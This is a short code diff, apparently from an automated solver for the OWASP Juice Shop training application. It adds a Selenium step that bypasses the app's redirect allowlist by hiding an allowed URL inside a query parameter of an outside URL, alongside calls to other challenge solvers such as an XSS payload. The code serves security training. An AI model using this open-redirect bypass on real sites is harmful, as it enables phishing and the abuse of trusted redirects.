@@ -96,6 +96,11 @@ def take_screenshot_of_score_and_quit(server, browser):
     print('complete.png saved successfully.')
     browser.quit()
 
+def redirect_whitelist(server, browser):
+    print('Redirect...', end=''),
+    browser.get('{}/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop'.format(server))
+    print('Success.')
+
 def solve_browser_challenges(server):
     print('\n== BROWSER CHALLENGES ==\n')
     try:
@@ -107,6 +112,7 @@ def solve_browser_challenges(server):
     bonus_xss_payload(server, browser)
     access_administration_site(server, browser)
     privacy_policy(server, browser)
+    redirect_whitelist(server, browser)
     take_screenshot_of_score_and_quit(server, browser)
     print('\n== BROWSER CHALLENGES COMPLETE ==\n')
 
